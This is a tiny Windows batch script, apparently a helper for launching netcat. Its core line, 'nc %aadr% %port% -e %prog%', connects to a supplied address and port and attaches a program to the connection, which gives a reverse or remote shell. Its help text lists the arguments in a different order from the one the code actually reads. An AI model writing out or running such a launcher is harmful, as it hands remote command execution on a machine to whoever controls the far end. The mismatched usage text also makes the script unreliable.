@echo off
REM New TCP Connection
set aadr=%1
set prog=%2
set port=%3
if "%aadr%"=="" goto HELP
nc %aadr% %port% -e %prog%
GOTO EOF
:HELP
echo.
echo NEWPROG [address] [port] [program to execute]
echo execute a new program on a different port
echo.
:EOF
